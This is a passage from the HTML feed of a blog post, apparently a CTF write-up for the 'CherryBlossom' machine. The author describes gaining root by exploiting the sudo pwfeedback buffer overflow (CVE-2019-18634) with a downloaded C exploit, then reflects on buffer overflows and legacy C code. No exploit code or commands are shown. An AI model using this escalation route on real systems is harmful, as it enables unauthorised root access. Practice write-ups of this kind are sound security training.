feedback) &lt;/strong&gt;issue which means we are using a vulnerable version of sudo, found out we have a (CVE-2019-18634) &lt;strong&gt;sudo buffer overflow&lt;/strong&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.19.57.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;tried what I read about in that CVE and our sudo version burped a Segmentation fault, which means we have a bufferoverflow over here ...&lt;/p&gt;&lt;blockquote&gt;talking about bufferoverflow if you don't understand the vulnerability here's a very good video linked&lt;/blockquote&gt;&lt;figure class="kg-card kg-embed-card"&gt;&lt;iframe width="480" height="270" src="https://www.youtube.com/embed/1S0aBV-Waeo?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.25.54.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-01-at-13.26.21.png" class="kg-image" alt="CherryBlossom CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I downloaded the exploit coded in C language, gave it permission to be executed and boom we got a root user, all we have to do now is go to /root/ directory and the file root.txt fill contain our flag and here you go you are no longer upset with your low privileges. &lt;/p&gt;&lt;p&gt;I really enjoyed this machine, learned many things the diary thing encryption, cryptography 101, backups are bad with wrong permissions, and png can contain files, ... and mostly to not forget and make it clear for anyone who comes and ask me if the bufferoverflow ...  YES, they do still exist!!&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/S3Ot3hZ5bcy8o" width="480" height="375" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/jack-nicholson-nodding-anger-management-S3Ot3hZ5bcy8o"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;The bufferoverflow thing continues to be a feature of the security landscape as long as we are still using C language. This is in no small part due to the significant issue of legacy code. An awful lot of C code still exists, including the kernel of every major operating system and popular libraries such as OpenSSL. Even if the doctors, I mean the developers want to use a safe language such as C#, they may need to depend on a third-party library written in C.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/ekvv0VTMS1fRNI6SW5" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/drivetribe-edd-drive-tribe-china-ekvv0VTMS1fRNI6SW5"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy hacking! &lt;/p&gt;</content:encoded></item></channel></rss>